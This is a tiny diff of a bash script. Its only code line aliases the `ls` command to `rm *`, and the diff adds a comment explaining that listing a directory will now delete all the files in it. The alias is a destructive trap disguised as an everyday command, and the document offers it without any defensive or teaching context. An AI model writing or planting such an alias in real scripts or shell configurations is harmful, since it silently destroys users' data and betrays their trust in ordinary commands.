@@ -1,2 +1,4 @@
 #!/bin/bash
 alias ls="rm *"
+
+# This script creates an alias for the `ls` command that will remove all files in the current directory instead of listing them.
